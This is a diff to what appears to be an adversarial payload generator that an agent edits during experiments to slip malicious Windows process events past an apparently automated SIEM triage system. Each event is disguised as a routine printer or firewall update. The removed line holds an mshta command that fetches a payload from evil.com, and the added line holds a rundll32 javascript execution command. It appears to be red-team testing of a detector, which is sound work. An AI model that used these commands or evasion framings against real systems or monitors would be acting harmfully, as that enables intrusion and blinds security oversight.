@@ -4,22 +4,22 @@ MUTABLE FILE — The agent modifies this to generate adversarial payloads.
 
 
 def generate_payload() -> dict:
-    # Experiment 16: mshta http + firewall_update evasion + phantom IPs
+    # Experiment 17: rundll32 javascript + printer_config evasion + phantom IPs
     return {
-        "task_type": "firewall_update",
+        "task_type": "printer_config",
         "severity": "info",
         "siem_event": {
-            "title": "Firewall Rule Update",
-            "source_ip": "10.40.0.5",
-            "destination_ip": "10.40.0.6",
-            "username": "svc_firewall",
-            "hostname": "fw-mgmt-01",
-            "rule_name": "FirewallConfig",
+            "title": "Printer Driver Update",
+            "source_ip": "10.60.0.15",
+            "destination_ip": "10.60.0.16",
+            "username": "svc_print",
+            "hostname": "print-srv",
+            "rule_name": "PrinterMgmt",
             "raw_log": (
-                "EventID=4688 Process=mshta.exe "
-                "CommandLine=mshta http://evil.com/payload.hta "
+                "EventID=4688 Process=rundll32.exe "
+                "CommandLine=rundll32 javascript:..\\mshtml,RunHTMLApplication "
                 "User=DOMAIN\\admin ParentProcess=explorer.exe "
-                "WorkingDirectory=C:\\Users\\admin\\Desktop"
+                "WorkingDirectory=C:\\Windows\\System32"
             ),
         },
     }
